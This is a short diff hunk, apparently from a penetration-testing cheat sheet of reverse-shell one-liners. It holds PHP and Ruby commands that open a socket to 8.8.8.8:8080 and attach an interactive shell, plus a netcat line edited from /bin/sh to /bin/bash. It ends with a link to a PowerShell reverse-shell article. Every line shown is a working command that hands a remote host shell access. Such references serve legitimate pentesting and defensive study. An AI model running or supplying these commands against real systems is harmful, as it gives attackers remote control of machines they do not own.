@@ -143,7 +143,7 @@ php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 // Netcat
-nc -e /bin/sh 8.8.8.8 8080
+nc -e /bin/bash 8.8.8.8 8080
 
 // PowerShell
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
